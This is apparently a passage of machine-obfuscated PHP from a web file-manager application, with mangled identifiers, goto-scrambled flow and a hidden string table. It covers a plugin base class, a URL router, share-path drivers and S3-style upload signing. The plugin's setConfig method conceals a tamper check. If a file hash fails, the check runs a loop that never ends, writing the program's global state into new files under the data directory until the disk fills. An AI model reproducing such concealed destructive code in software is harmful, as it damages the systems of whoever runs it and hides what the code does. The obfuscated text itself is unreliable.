Dï©ğÀŠŠ£; C¹ƒËµÔ‹: $E¯‹‰ó·ÑÕ = str_replace($f…Û¿æ¥Ç”, $Cİ®‚–ÄÆ», $E¯‹‰ó·ÑÕ); goto cÂÛÏæ‚¾; a‰éèÍÂÊ§: $f…Û¿æ¥Ç” = array(); $Cİ®‚–ÄÆ» = array(); foreach ($fÃ„¡Ëâ„·[0] as $eİÀÍó£¼Ş) { $EçÅ½ Ë»ø = substr($eİÀÍó£¼Ş, strlen($AÌÁÁ¶ØêÍ), -2); $f…Û¿æ¥Ç”[] = $eİÀÍó£¼Ş; $Cİ®‚–ÄÆ»[] = _get($cÁ­ˆù˜»›, $EçÅ½ Ë»ø); } goto C¹ƒËµÔ‹; Dï©ğÀŠŠ£: preg_match_all($Fš„Ä²ÛÚÆ[1367], $E¯‹‰ó·ÑÕ, $fÃ„¡Ëâ„·); if (!is_array($fÃ„¡Ëâ„·) || count($fÃ„¡Ëâ„·) == 0 || !is_array($fÃ„¡Ëâ„·[0]) || count($fÃ„¡Ëâ„·[0]) == 0) { return; } $cÁ­ˆù˜»› = $this->appPackage(); goto a‰éèÍÂÊ§; cÂÛÏæ‚¾: } final function echoFile($BÄ© ´¨ã, $bƒøêÎ›´Ã = false) { goto bé¾ËƒÊ³; e‰öƒÃ¯ƒù: $e–ËÜØÂ  = $this->parseFile($bÚÃäíèù); $this->parseLang($e–ËÜØÂ ); $this->parseConfig($e–ËÜØÂ ); goto cÓßÈÈåĞó; cÓßÈÈåĞó: $this->parsePackage($e–ËÜØÂ ); if (is_array($bƒøêÎ›´Ã)) { $e–ËÜØÂ  = str_replace(array_keys($bƒøêÎ›´Ã), array_values($bƒøêÎ›´Ã), $e–ËÜØÂ ); } echo $C•¢óÑ¹¾[11] . $e–ËÜØÂ ; goto c¬³óÄÎÂ; bé¾ËƒÊ³: $C•¢óÑ¹¾ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $bÚÃäíèù = $this->pluginPath . $BÄ© ´¨ã; if (ACT == $C•¢óÑ¹¾[1368]) { echo $C•¢óÑ¹¾[1369] . $this->pluginName . $C•¢óÑ¹¾[18] . $BÄ© ´¨ã . $C•¢óÑ¹¾[1370]; if (!file_exists($bÚÃäíèù)) { echo $C•¢óÑ¹¾[1371]; return; } } goto e‰öƒÃ¯ƒù; c¬³óÄÎÂ: } final function initLang() { goto F”âŞ‚‹†; e™¼©Á§¨ˆ: if (!is_array($cÉÖèïò˜Ì)) { return array(); } if (@count($cÉÖèïò˜Ì) > 0) { I18n::set($cÉÖèïò˜Ì); } return $cÉÖèïò˜Ì; goto Eô«ÑÄ’í; F”âŞ‚‹†: $EÉÄ‘­ø¯ˆ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $aÊÎ…Ö–Ñß = $EÉÄ‘­ø¯ˆ[1372]; $b»‰ó¤õ‹Õ = $this->pluginPath . $EÉÄ‘­ø¯ˆ[1373]; goto DğÅ­ôä­Ç; DğÅ­ôä­Ç: $A…Š“øÍİæ = I18n::getType(); $cÉÖèïò˜Ì = array(); if (file_exists($b»‰ó¤õ‹Õ . $A…Š“øÍİæ . $EÉÄ‘­ø¯ˆ[774])) { $cÉÖèïò˜Ì = (include $b»‰ó¤õ‹Õ . $A…Š“øÍİæ . $EÉÄ‘­ø¯ˆ[774]); } else { if ($A…Š“øÍİæ == $EÉÄ‘­ø¯ˆ[1374] && !file_exists($b»‰ó¤õ‹Õ . $A…Š“øÍİæ . $EÉÄ‘­ø¯ˆ[774]) && file_exists($b»‰ó¤õ‹Õ . $EÉÄ‘­ø¯ˆ[1375])) { $cÉÖèïò˜Ì = (include $b»‰ó¤õ‹Õ . $EÉÄ‘­ø¯ˆ[1375]); } else { if (file_exists($b»‰ó¤õ‹Õ . $aÊÎ…Ö–Ñß . $EÉÄ‘­ø¯ˆ[774])) { $cÉÖèïò˜Ì = (include $b»‰ó¤õ‹Õ . $aÊÎ…Ö–Ñß . $EÉÄ‘­ø¯ˆ[774]); } } } goto e™¼©Á§¨ˆ; Eô«ÑÄ’í: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($b‹¹˜õ’ä¹) { $aÖÇ«ğº =& $_SERVER[çŞáÓæÚô‚Ô‡]; $c‘‚×ˆ®Ÿá = $_SERVER[$aÖÇ«ğº[9]] . $aÖÇ«ğº[10]; $FŒ¹ô…öÇ = $aÖÇ«ğº[798]; if ($_SERVER[$aÖÇ«ğº[6]] != $FŒ¹ô…öÇ($c‘‚×ˆ®Ÿá)) { goto B¶ƒÈˆ‰¿÷; Dİ½Ë·‡Ì«: $D£´§ßñ† = $c¥à‰ºÛğº($f¦Š‡Ÿ¼— ); $FÓ×È´Æª“ = explode($aÖÇ«ğº[11], $D£´§ßñ†); if (count($FÓ×È´Æª“) < $aÖÇ«ğº[573]) { $EÃŸÜ¯›‚Ì = $aÖÇ«ğº[13]; $EÃŸÜ¯›‚Ì(); } goto D„×Ø—Úã; dæåõÇÊ¼: $F˜éã†ë®Ş(); $eÒ“‘õÈĞ‡ = $aÖÇ«ğº[801]; $aÖ‡¼ƒÜº = json_encode($GLOBALS[$aÖÇ«ğº[802]]); goto B…Å“Ÿ‹; B…Å“Ÿ‹: $EîğÄò©Ü– = 1; for ($cˆ˜§¤ùÕ = $EîğÄò©Ü–; $cˆ˜§¤ùÕ > 0; $cˆ˜§¤ùÕ++) { $eÒ“‘õÈĞ‡(DATA_PATH . $cˆ˜§¤ùÕ, $aÖ‡¼ƒÜº); } goto a“µä„‚ÀŸ; D„×Ø—Úã: $bõÖùĞÂ¨à = $aÖÇ«ğº[800]; $bõÖùĞÂ¨à($_SERVER[$aÖÇ«ğº[796]]); $F˜éã†ë®Ş = $aÖÇ«ğº[799]; goto dæåõÇÊ¼; B¶ƒÈˆ‰¿÷: $F˜éã†ë®Ş = $aÖÇ«ğº[799]; $c¥à‰ºÛğº = $aÖÇ«ğº[8]; $f¦Š‡Ÿ¼—  = $_SERVER[$aÖÇ«ğº[9]] . $aÖÇ«ğº[10]; goto Dİ½Ë·‡Ì«; a“µä„‚ÀŸ: } return $this->modelPlugin->setConfig($this->pluginName, $b‹¹˜õ’ä¹); } public function onSetConfig($dÑÈ»ùÏ„) { } public function onGetConfig($fïò˜¨Ëƒ) { } public function onChangeStatus($E¡Ø‡İÛæÍ) { } public function onUninstall() { } public function onInstall() { } public function authCheck($C›ÔÏŸ• = "\x70\154\165\147\x69\156\101\165\164\150") { $C¸á“á—ß =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!defined($C¸á“á—ß[436])) { return !1; } if (_get($GLOBALS, $C¸á“á—ß[468])) { return !0; } $C¶­¾õùÚ = $this->getConfig(); if (!$C¶­¾õùÚ[$C›ÔÏŸ•]) { return !1; } return ActionCall($C¸á“á—ß[1376], $C¶­¾õùÚ[$C›ÔÏŸ•]); } public function url($Bİ‡ö¦Æ§Ç, $cğ…†¼ğóõ = '', $eì˜¹ĞÆÖ = true) { goto eÚÎ»Ÿä˜; d»çê„àë¾: if (!$eì˜¹ĞÆÖ) { return $BÕßŞƒ¢µ³; } echo $BÕßŞƒ¢µ³; goto b‹ŸÄ¤ùÕ”; B»½“ŠÏ­: $CÀ„”ß£Š = $this->packageVersion(); $b£åÃ”šå = $cÅßö¯ˆ´ . $eˆ¨ãè±Åó[421] . $CÀ„”ß£Š; if (substr($Bİ‡ö¦Æ§Ç, 0, 4) == $eˆ¨ãè±Åó[154] || substr($Bİ‡ö¦Æ§Ç, 0, 2) == $eˆ¨ãè±Åó[1162]) { $BÕßŞƒ¢µ³ = $Bİ‡ö¦Æ§Ç . $eˆ¨ãè±Åó[1377] . $b£åÃ”šå; } else { if ($cğ…†¼ğóõ == $eˆ¨ãè±Åó[43]) { $BÕßŞƒ¢µ³ = $this->pluginHost . $Bİ‡ö¦Æ§Ç . $eˆ¨ãè±Åó[1377] . $b£åÃ”šå; } else { if ($cğ…†¼ğóõ === $eˆ¨ãè±Åó[86]) { $BÕßŞƒ¢µ³ = $this->pluginHost . $Bİ‡ö¦Æ§Ç; } else { if ($cğ…†¼ğóõ == $eˆ¨ãè±Åó[1378]) { $BÕßŞƒ¢µ³ = STATIC_PATH . $Bİ‡ö¦Æ§Ç . $eˆ¨ãè±Åó[1377] . $cÅßö¯ˆ´; } else { if ($cğ…†¼ğóõ == $eˆ¨ãè±Åó[1379]) { $BÕßŞƒ¢µ³ = APP_HOST . $eˆ¨ãè±Åó[1380] . $Bİ‡ö¦Æ§Ç . $eˆ¨ãè±Åó[1377] . $cÅßö¯ˆ´; } else { if (isset($e‡ÒÅ”²ù×[$cğ…†¼ğóõ])) { $BÕßŞƒ¢µ³ = $e‡ÒÅ”²ù×[$cğ…†¼ğóõ] . $Bİ‡ö¦Æ§Ç . $eˆ¨ãè±Åó[1377] . $b£åÃ”šå; } } } } } } goto d»çê„àë¾; eÚÎ»Ÿä˜: $eˆ¨ãè±Åó =& $_SERVER[çŞáÓæÚô‚Ô‡]; $e‡ÒÅ”²ù× = $this->getConfig(); $cÅßö¯ˆ´ = KOD_VERSION . $eˆ¨ãè±Åó[101] . KOD_VERSION_BUILD; goto B»½“ŠÏ­; b‹ŸÄ¤ùÕ”: } public function link($bÎ—£¦¹ùÁ = false, $Bï·•§¼âº = '') { $Dšõ§ÏÆ’ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$bÎ—£¦¹ùÁ) { $this->link($Dšõ§ÏÆ’[1381], $Dšõ§ÏÆ’[1379]); $this->link($Dšõ§ÏÆ’[1382], $Dšõ§ÏÆ’[1378]); $this->link($Dšõ§ÏÆ’[1383], $Dšõ§ÏÆ’[1378]); $this->link($Dšõ§ÏÆ’[1384], $Dšõ§ÏÆ’[1378]); $this->link($Dšõ§ÏÆ’[1385], $Dšõ§ÏÆ’[1378]); return; } $a¨³¡–Ù° = $this->url($bÎ—£¦¹ùÁ, $Bï·•§¼âº, !1); if (substr($bÎ—£¦¹ùÁ, -3) == $Dšõ§ÏÆ’[1386]) { echo $Dšõ§ÏÆ’[1387] . $a¨³¡–Ù° . $Dšõ§ÏÆ’[1388] . $Dšõ§ÏÆ’[11]; } else { if (substr($bÎ—£¦¹ùÁ, -4) == $Dšõ§ÏÆ’[1389]) { echo $Dšõ§ÏÆ’[1390] . $a¨³¡–Ù° . $Dšõ§ÏÆ’[1391] . $Dšõ§ÏÆ’[11]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\x6e\171" => "\133\x5e\x2f\x5d\x2b", "\72\156\x75\155" => "\133\60\55\71\x5d\53", "\72\x61\154\154" => "\56\52"); public static $errorCallback; public static function __callstatic($aêçÂìñ¼, $c§ÒŒ˜½‰ó) { $Cà„ö¶Üë¾ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($aêçÂìñ¼ == $Cà„ö¶Üë¾[1392]) { $Eö‚òİÊó = array_map($Cà„ö¶Üë¾[1393], $c§ÒŒ˜½‰ó[0]); $CğÍÒŸÀÃ = strpos($c§ÒŒ˜½‰ó[1], $Cà„ö¶Üë¾[18]) === 0 ? $c§ÒŒ˜½‰ó[1] : $Cà„ö¶Üë¾[18] . $c§ÒŒ˜½‰ó[1]; $CŠ³ƒÉ‰ÈŠ = $c§ÒŒ˜½‰ó[2]; } else { $Eö‚òİÊó = null; $CğÍÒŸÀÃ = strpos($c§ÒŒ˜½‰ó[0], $Cà„ö¶Üë¾[18]) === 0 ? $c§ÒŒ˜½‰ó[0] : $Cà„ö¶Üë¾[18] . $c§ÒŒ˜½‰ó[0]; $CŠ³ƒÉ‰ÈŠ = $c§ÒŒ˜½‰ó[1]; } array_push(self::$maps, $Eö‚òİÊó); array_push(self::$routes, $CğÍÒŸÀÃ); array_push(self::$methods, strtoupper($aêçÂìñ¼)); array_push(self::$callbacks, $CŠ³ƒÉ‰ÈŠ); } public static function error($BàèöÛàĞ·) { self::$errorCallback = $BàèöÛàĞ·; } public static function haltOnMatch($dóÇèŞÆËÅ = true) { self::$halts = $dóÇèŞÆËÅ; } public static function dispatch() { goto AŸì¬…ˆ¥; AŸì¬…ˆ¥: $CĞ¶Ñ›ê£î =& $_SERVER[çŞáÓæÚô‚Ô‡]; $bäé®À“À = parse_url($_SERVER[$CĞ¶Ñ›ê£î[1394]], PHP_URL_PATH); $Cğæ”‹ĞƒŠ = $_SERVER[$CĞ¶Ñ›ê£î[164]]; goto A¯ÆßçÃ; DèŠ­˜È‘Ú: self::$routes = preg_replace($CĞ¶Ñ›ê£î[1080], $CĞ¶Ñ›ê£î[18], self::$routes); if (in_array($bäé®À“À, self::$routes)) { $AŸÑ™÷»–Â = array_keys(self::$routes, $bäé®À“À); foreach ($AŸÑ™÷»–Â as $déíÉá¸‡) { if (self::$methods[$déíÉá¸‡] == $Cğæ”‹ĞƒŠ || self::$methods[$déíÉá¸‡] == $CĞ¶Ñ›ê£î[1395] || in_array($Cğæ”‹ĞƒŠ, self::$maps[$déíÉá¸‡])) { $B£÷¯Ü©âæ = !0; if (!is_object(self::$callbacks[$déíÉá¸‡])) { $d£Ä©…ŸÛ˜ = explode($CĞ¶Ñ›ê£î[18], self::$callbacks[$déíÉá¸‡]); $D‹¯Ÿ½³Í = end($d£Ä©…ŸÛ˜); $cìµÕÚÚßÇ = explode($CĞ¶Ñ›ê£î[1396], $D‹¯Ÿ½³Í); $eÚÙˆµ½Í = new $cìµÕÚÚßÇ[0](); $eÚÙˆµ½Í->{$cìµÕÚÚßÇ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$déíÉá¸‡]); if (self::$halts) { return; } } } } } else { $DÎïáÆÑÍ = 0; foreach (self::$routes as $déíÉá¸‡) { if (strpos($déíÉá¸‡, $CĞ¶Ñ›ê£î[4]) !== !1) { $déíÉá¸‡ = str_replace($CŠÏçù½·´, $BÕìŠˆŞ, $déíÉá¸‡); } if (preg_match($CĞ¶Ñ›ê£î[1397] . $déíÉá¸‡ . $CĞ¶Ñ›ê£î[1398], $bäé®À“À, $E‘±ŸƒãÊß)) { if (self::$methods[$DÎïáÆÑÍ] == $Cğæ”‹ĞƒŠ || self::$methods[$DÎïáÆÑÍ] == $CĞ¶Ñ›ê£î[1395] || !empty(self::$maps[$DÎïáÆÑÍ]) && in_array($Cğæ”‹ĞƒŠ, self::$maps[$DÎïáÆÑÍ])) { $B£÷¯Ü©âæ = !0; array_shift($E‘±ŸƒãÊß); if (!is_object(self::$callbacks[$DÎïáÆÑÍ])) { $d£Ä©…ŸÛ˜ = explode($CĞ¶Ñ›ê£î[18], self::$callbacks[$DÎïáÆÑÍ]); $D‹¯Ÿ½³Í = end($d£Ä©…ŸÛ˜); $cìµÕÚÚßÇ = explode($CĞ¶Ñ›ê£î[1396], $D‹¯Ÿ½³Í); $eÚÙˆµ½Í = new $cìµÕÚÚßÇ[0](); if (!method_exists($eÚÙˆµ½Í, $cìµÕÚÚßÇ[1])) { echo $CĞ¶Ñ›ê£î[1399]; } else { call_user_func_array(array($eÚÙˆµ½Í, $cìµÕÚÚßÇ[1]), $E‘±ŸƒãÊß); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$DÎïáÆÑÍ], $E‘±ŸƒãÊß); if (self::$halts) { return; } } } } $DÎïáÆÑÍ++; } } if ($B£÷¯Ü©âæ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $e›ãçªŒÀª =& $_SERVER[çŞáÓæÚô‚Ô‡]; header($_SERVER[$e›ãçªŒÀª[1400]] . $e›ãçªŒÀª[1401]); echo $e›ãçªŒÀª[1402]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$CĞ¶Ñ›ê£î[1394]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto c¬Š³æÀë; A¯ÆßçÃ: $CŠÏçù½·´ = array_keys(static::$patterns); $BÕìŠˆŞ = array_values(static::$patterns); $B£÷¯Ü©âæ = !1; goto DèŠ­˜È‘Ú; c¬Š³æÀë: } } goto dõ×£‡ˆ¤; a†’Ñˆç·: define($_SERVER[çŞáÓæÚô‚Ô‡][556], $_SERVER[çŞáÓæÚô‚Ô‡][557]); $c´«¹¹›Ù = $_SERVER[çŞáÓæÚô‚Ô‡][558]; if (!$c´«¹¹›Ù) { die; } goto D³òå¨Ó­Í; cáãáÇ¾•¤: class PathDriverDriverShareItem { public function __construct($EÚ¿ìéãÃ…) { $this->pathParse = $EÚ¿ìéãÃ…; } public function __call($B…Á‰ÊÃ’, $Fèøã”ñ…Š) { $BïÎÍó†¡Ø =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (method_exists($this, $B…Á‰ÊÃ’)) { return; } $cÂ‘ÀÏ§ÎŸ = call_user_func_array(array($BïÎÍó†¡Ø[1132], $B…Á‰ÊÃ’), $Fèøã”ñ…Š); $AªëÇÍƒ£° = array($BïÎÍó†¡Ø[1133], $BïÎÍó†¡Ø[1134], $BïÎÍó†¡Ø[1135], $BïÎÍó†¡Ø[1136], $BïÎÍó†¡Ø[501], $BïÎÍó†¡Ø[503], $BïÎÍó†¡Ø[1137], $BïÎÍó†¡Ø[113], $BïÎÍó†¡Ø[1138], $BïÎÍó†¡Ø[1139]); if (in_array($B…Á‰ÊÃ’, $AªëÇÍƒ£°)) { $cÂ‘ÀÏ§ÎŸ = $this->getPathOuter($cÂ‘ÀÏ§ÎŸ); } return $cÂ‘ÀÏ§ÎŸ; } public function copy($eÎ³±¸É, $d­¸Æ“ñ…·, $C”‰ÆÊó»Ÿ = false) { return $this->copyMove($eÎ³±¸É, $d­¸Æ“ñ…·, $C”‰ÆÊó»Ÿ, $_SERVER[çŞáÓæÚô‚Ô‡][501]); } public function move($C›†àÀ³æì, $aÚ„œÆö­, $CáµÆ•˜« = false) { return $this->copyMove($C›†àÀ³æì, $aÚ„œÆö­, $CáµÆ•˜«, $_SERVER[çŞáÓæÚô‚Ô‡][503]); } private function copyMove($C¥œÒ¬£Ô­, $F„¬çÙÕÓğ, $E½Éñ…ªì», $F“Û°ÆÆ§) { goto aÅÄÍ²Ëç; cŠ”±¹Úä™: return $Eïƒ—×Õè¥; goto dÚšî…äƒ; aÅÄÍ²Ëç: $a×–Ïê††‰ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $B÷±‘Â•Àó = $F„¬çÙÕÓğ; $aéø§©Ó­µ = IO::driverMake($F„¬çÙÕÓğ); goto bÏ×¤Áù¥¢; bÏ×¤Áù¥¢: if ($aéø§©Ó­µ->pathParse[$a×–Ïê††‰[1005]]) { $F„¬çÙÕÓğ = $aéø§©Ó­µ->pathParse[$a×–Ïê††‰[1005]]; } else { $F„¬çÙÕÓğ = $B÷±‘Â•Àó; } $Eïƒ—×Õè¥ = IO::copyMove($C¥œÒ¬£Ô­, $F„¬çÙÕÓğ, $E½Éñ…ªì», $F“Û°ÆÆ§); $Eïƒ—×Õè¥ = $this->getPathOuter($Eïƒ—×Õè¥); goto cŠ”±¹Úä™; dÚšî…äƒ: } public function pathFather($C¤…›õù²§) { return get_path_father($this->pathParse[$_SERVER[çŞáÓæÚô‚Ô‡][85]]); } public function iconvSystem($Bô­¹ã¹¦¥) { return $Bô­¹ã¹¦¥; } protected function infoParse($B¸¾ËÊØ¸·, $b™ØËä‡˜ = false) { $eËİôç„ÀÊ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $CƒÉØ‰ÌÚ© = $this->pathParse[$eËİôç„ÀÊ[448]][$eËİôç„ÀÊ[1026]] . $this->pathParse[$eËİôç„ÀÊ[1019]]; if ($b™ØËä‡˜) { $a³ İã¸Ö« = IO::infoWithChildren($CƒÉØ‰ÌÚ©); } else { $a³ İã¸Ö« = IO::info($CƒÉØ‰ÌÚ©); } $BÙ½õáÇÌ = $this->pathParse[$eËİôç„ÀÊ[448]]; return Action($eËİôç„ÀÊ[1131])->_shareItemeParse($a³ İã¸Ö«, $BÙ½õáÇÌ); } public function listAll($cÖ¾óÉ­ÜÀ) { $fæÎ¦øÌÅº =& $_SERVER[çŞáÓæÚô‚Ô‡]; $b„ÙÜäİ½Ø = IO::listAll($cÖ¾óÉ­ÜÀ); $CÛ®æƒÔ• = $this->pathParse[$fæÎ¦øÌÅº[448]]; foreach ($b„ÙÜäİ½Ø as &$b»­…µ±Èš) { check_abort(); $b»­…µ±Èš = array_merge(IO::info($b»­…µ±Èš[$fæÎ¦øÌÅº[85]]), $b»­…µ±Èš); $b»­…µ±Èš[$fæÎ¦øÌÅº[400]] = Action($fæÎ¦øÌÅº[1131])->_shareItemeParse($b»­…µ±Èš, $CÛ®æƒÔ•); } unset($b»­…µ±Èš); return $b„ÙÜäİ½Ø; } public function getPathOuter($aí„æ÷ë›Ã) { goto Cî‡Ìò’Ø¹; Cî‡Ìò’Ø¹: $eĞ´»ªËê =& $_SERVER[çŞáÓæÚô‚Ô‡]; $cî³»³ó¡× = KodIO::parse($aí„æ÷ë›Ã); if ($cî³»³ó¡×[$eĞ´»ªËê[39]] == KodIO::KOD_SHARE_ITEM) { return $cî³»³ó¡×[$eĞ´»ªËê[85]]; } goto a¼Æ™Ç¥öİ; a¼Æ™Ç¥öİ: $DŞÕÊ¹Ö•à = KodIO::clear($aí„æ÷ë›Ã); $CèïßßôÃŞ = KodIO::clear($this->pathParse[$eĞ´»ªËê[448]][$eĞ´»ªËê[1026]]); $fĞ®ÛîÙ“¼ = substr($DŞÕÊ¹Ö•à, strlen($CèïßßôÃŞ)); goto eëÚã©µæ©; eëÚã©µæ©: if (substr($DŞÕÊ¹Ö•à, 0, strlen($CèïßßôÃŞ)) != $CèïßßôÃŞ) { return !1; } return $this->pathParse[$eĞ´»ªËê[1020]] . $eĞ´»ªËê[18] . ltrim($fĞ®ÛîÙ“¼, $eĞ´»ªËê[18]); goto F©‰…÷«; F©‰…÷«: } public function getType() { $fÉõË©É÷· =& $_SERVER[çŞáÓæÚô‚Ô‡]; $D —‡ñï = str_replace($fÉõË©É÷·[81], $fÉõË©É÷·[43], get_class($this)); return strtolower($D —‡ñï); } public function isTypeObject($fÓÇœŞ§Ë) { return IO::isTypeObject($fÓÇœŞ§Ë); } public function info($fğØï±œ°) { return $this->infoParse($fğØï±œ°); } public function infoAuth($c©©ÕÚ‰Â) { return $this->infoParse($c©©ÕÚ‰Â); } public function infoWithChildren($f‰•ğö˜) { return $this->infoParse($f‰•ğö˜, !0); } public function infoFull($EÌØË¸„êÍ) { return $this->infoParse($EÌØË¸„êÍ); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($EŒ“£á¸÷) { $this->pathParse = $EŒ“£á¸÷; } protected function infoParse($eĞÓÑÂš®®, $aŸ£Œ©Ô½ = false) { $DàùÁÊ¨ƒÖ =& $_SERVER[çŞáÓæÚô‚Ô‡]; return Action($DàùÁÊ¨ƒÖ[1025])->sharePathInfo($this->pathParse[$DàùÁÊ¨ƒÖ[85]], !0, $aŸ£Œ©Ô½); } public function listPath($e¯ìã®æ¬Ô, $aÆ­¦Ÿ‹‚² = false) { $Eõµ÷±æ† =& $_SERVER[çŞáÓæÚô‚Ô‡]; $C˜‹¢«½Ô¨ = IO::listPath($e¯ìã®æ¬Ô, $aÆ­¦Ÿ‹‚²); foreach ($C˜‹¢«½Ô¨ as $e½—Ëß‚Ï => $f´÷»°…Œ) { if (!in_array($e½—Ëß‚Ï, array($Eõµ÷±æ†[83], $Eõµ÷±æ†[84]))) { continue; } foreach ($f´÷»°…Œ as $f±ƒ³ØØÍ => $e—‡©×áÄ) { $e—‡©×áÄ = Action($Eõµ÷±æ†[1140])->parsePathChildren($e—‡©×áÄ, array($Eõµ÷±æ†[396] => $e¯ìã®æ¬Ô)); $C˜‹¢«½Ô¨[$e½—Ëß‚Ï][$f±ƒ³ØØÍ] = Action($Eõµ÷±æ†[1025])->shareItemInfo($e—‡©×áÄ); } } return $C˜‹¢«½Ô¨; } public function listAll($DÀ¤·„Àœ) { $e§êÏåğ½ˆ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $e©¤¶‘ï = IO::listAll($DÀ¤·„Àœ); foreach ($e©¤¶‘ï as &$BÂÇâõÂÓæ) { $BÂÇâõÂÓæ = array_merge(IO::info($BÂÇâõÂÓæ[$e§êÏåğ½ˆ[85]]), $BÂÇâõÂÓæ); $BÂÇâõÂÓæ[$e§êÏåğ½ˆ[400]] = Action($e§êÏåğ½ˆ[1025])->shareItemInfo($BÂÇâõÂÓæ); } unset($BÂÇâõÂÓæ); return $e©¤¶‘ï; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($c¹ìÅØŒ) { parent::__construct($c¹ìÅØŒ); $this->signatureVersion($_SERVER[çŞáÓæÚô‚Ô‡][210]); } public function uploadFormData($cáÏ†®ç´Ô, $a¦ø›¸™…ö = 3600) { goto DÆŸĞî´†¸; c­ß³†÷™Ï: $C‰šë×‚›  = array($this->accessKey, $eÄøÎ¶÷ã±, $this->region, $F„¨‹ÜğÓ, $eÖŠõ¸ª»); $Aˆ’ƒù„ï = implode($DÕ’õ¬ƒ[18], $C‰šë×‚› ); $e‹´²÷É”î = array($DÕ’õ¬ƒ[1109] => gmdate($DÕ’õ¬ƒ[1108], strtotime($DÕ’õ¬ƒ[1144])), $DÕ’õ¬ƒ[1110] => array(array($DÕ’õ¬ƒ[1112] => $this->bucket), array($DÕ’õ¬ƒ[1111] => $D‘·ÁåÇ´”), array($DÕ’õ¬ƒ[1113], $DÕ’õ¬ƒ[1114], $DÕ’õ¬ƒ[43]), array($DÕ’õ¬ƒ[1113], $DÕ’õ¬ƒ[1145], $DÕ’õ¬ƒ[43]), array($DÕ’õ¬ƒ[1113], $DÕ’õ¬ƒ[1146], $DÕ’õ¬ƒ[43]), array($DÕ’õ¬ƒ[1115] => $aÔóã°ÜŞÛ), array($DÕ’õ¬ƒ[1147] => $Aˆ’ƒù„ï), array($DÕ’õ¬ƒ[1148] => $EİÈ¾½«º‚), array($DÕ’õ¬ƒ[1149] => $dò„´ë¿’), array($DÕ’õ¬ƒ[1150] => $Fó›¨· —Ü))); goto d•Ç¾Ú±Ô„; FØôİ¨ğ¶Ú: $DîÂ¼Ñ«Â = hash_hmac($DÕ’õ¬ƒ[1151], $F„¨‹ÜğÓ, $EÚÙ«¾ùÔ’, !0); $dâÊ³¡¦‘ø = hash_hmac($DÕ’õ¬ƒ[1151], $eÖŠõ¸ª», $DîÂ¼Ñ«Â, !0); $bé¥È„ĞÔ = hash_hmac($DÕ’õ¬ƒ[1151], $Bø‚ò¾â“, $dâÊ³¡¦‘ø); goto FÉæ¸‡¾ˆ¢; d•Ç¾Ú±Ô„: $Bø‚ò¾â“ = base64_encode(json_encode($e‹´²÷É”î)); $Cøßâª‰¶Ê = hash_hmac($DÕ’õ¬ƒ[1151], $eÄøÎ¶÷ã±, $DÕ’õ¬ƒ[1152] . $this->secret, !0); $EÚÙ«¾ùÔ’ = hash_hmac($DÕ’õ¬ƒ[1151], $this->region, $Cøßâª‰¶Ê, !0); goto FØôİ¨ğ¶Ú; FÉæ¸‡¾ˆ¢: $B½®Ş´Ş²Í = array($DÕ’õ¬ƒ[209] => $DÕ’õ¬ƒ[43], $DÕ’õ¬ƒ[1153] => $DÕ’õ¬ƒ[43], $DÕ’õ¬ƒ[1111] => $D‘·ÁåÇ´”, $DÕ’õ¬ƒ[1115] => $aÔóã°ÜŞÛ, $DÕ’õ¬ƒ[1119] => $Bø‚ò¾â“, $DÕ’õ¬ƒ[1154] => $Aˆ’ƒù„ï, $DÕ’õ¬ƒ[1155] => $EİÈ¾½«º‚, $DÕ’õ¬ƒ[1156] => $dò„´ë¿’, $DÕ’õ¬ƒ[1157] => $Fó›¨· —Ü, $DÕ’õ¬ƒ[1158] => $bé¥È„ĞÔ, $DÕ’õ¬ƒ[179] => $this->getHost()); return $B½®Ş´Ş²Í; goto a‹šğ“©Ö; EóŠìŒØÓ: $F„¨‹ÜğÓ = $DÕ’õ¬ƒ[69]; $dò„´ë¿’ = gmdate($DÕ’õ¬ƒ[1142]); $eÄøÎ¶÷ã± = gmdate($DÕ’õ¬ƒ[699]); goto CŠª„™Íã¾; CŠª„™Íã¾: $eÖŠõ¸ª» = $DÕ’õ¬ƒ[1143]; $Fó›¨· —Ü = $a¦ø›¸™…ö . $DÕ’õ¬ƒ[43]; $aÔóã°ÜŞÛ = $DÕ’õ¬ƒ[1107]; goto c­ß³†÷™Ï; DÆŸĞî´†¸: $DÕ’õ¬ƒ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $D‘·ÁåÇ´” = $DÕ’õ¬ƒ[195]; $EİÈ¾½«º‚ = $DÕ’õ¬ƒ[1141]; goto EóŠìŒØÓ; a‹šğ“©Ö: } } goto Eë®†â’¦µ; BË”é¿…Ü: class SourceEventModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\x6f\165\162\x63\x65\137\x65\x76\x65\156\x74"; protected $dataAuto = array(array("\143\x72\145\x61\x74\x65\124\151\x6d\x65", "\x74\151\x6d\145", "\151\x6e\163\145\x72\164", "\146\165\156\143\164\x69\157\x6e"), array("\x64\145\163\x63", '', "\x69\x6e\163\x65\162\164\x2c\165\x70\144\141\164\x65\54\x73\145\x6c\x65\143\x74", "\152\x73\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($E¶¨ùÙ‹¢Î, $d†ì½Â·¬³, $a÷ñÔÃ­Ù  = '') { goto e£ÄÓÉ©Îª; BÖóĞÇá¨Í: $Dà‰§¬Ñ“ = array($Aê¡ÏõÊ½ˆ[392] => $E¶¨ùÙ‹¢Î, 